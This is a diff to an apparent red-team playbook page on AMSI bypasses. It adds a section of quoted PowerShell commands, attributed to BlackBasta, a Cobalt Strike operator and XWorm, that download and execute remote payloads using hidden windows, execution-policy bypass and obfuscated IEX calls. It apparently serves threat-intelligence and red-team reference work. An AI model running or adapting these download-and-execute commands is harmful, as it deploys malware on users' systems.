@@ -2,16 +2,17 @@
 
 ## Table of Contents
 
-- [Tooling](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#tooling)
-- [AMSI Bypass](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#amsi-bypass)
-    - [PowerShell Downgrade](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#powershell-downgrade)
-    - [Fabian Mosch / Matt Graeber Bypass](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#fabian-mosch--matt-graeber-bypass)
-    - [Hooking](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#hooking)
-    - [Memory Patching](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#memory-patching)
-    - [Forcing an Error](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#forcing-an-error)
-    - [Registry Key Modification](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#registry-key-modification)
-    - [DLL Hijacking](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#dll-hijacking)
-- [Windows Defender](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#windows-defender)
+- Tooling
+- AMSI Bypass
+    - PowerShell Downgrade
+    - Fabian Mosch / Matt Graeber Bypass
+    - Hooking
+    - Memory Patching
+    - Forcing an Error
+    - Registry Key Modification
+    - DLL Hijacking
+- Windows Defender
+- Powershell downloading / running
 
 ## Tooling
 
@@ -275,15 +276,24 @@ Also with:
 - GetProcAddress
 - LoadLibrary
 
-### Previous
+## Powershell downloading / running
 
-- [4 Exploitation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4-Exploitation.md)
-- [4.1 Defense Evasion](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.1-Defense-Evasion.md)
-- [4.2 Credential Dumping](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.2-Credential-Dumping.md)
-- [4.3 Privilege Escalation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.3-Privilege-Escalation.md)
-- [4.4 Lateral Movement](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.4-Lateral-Movement.md)
+### Used by BLACKBASTA to deploy cobalt strike.
 
-### Next
+```shell
+powershell.exe  iwr hxxp://207[.[246.74.189:804/download/Diablo.log -outfile C:\Users\Public\Diablo.log
+rundll32.exe C:\Users\Public\Diablo.log,ExtractFeatures
+```
 
-- [5.1 Persistence](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.1-Persistence.md)
-- [5.2 Situational Awareness](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.2-Situational-Awareness.md)
+### Another group deploy cobalt strike:
+
+```
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxp://159[.]65[.]130[.]146:4444/a'))"
+```
+
+### XWORM Malware:
+
+```
+powershell.exe  -w h -ExecutionPolicy Bypass -Command "(I'w'r('hxxps://paste[.]ee/r/mzeOz/0') -useB) | .('{1}{$}'.replace('$','0')-f'!','I').replace('!','ex');"
+powershell.exe  -w h -ExecutionPolicy Bypass -Command "(I'w'r('hxxps://paste[.]ee/r/pxLkv/0') -useB) | .('{1}{jaHxp}'.replace('jaHxp','0')-f'!','I').replace('!','ex');"
+```
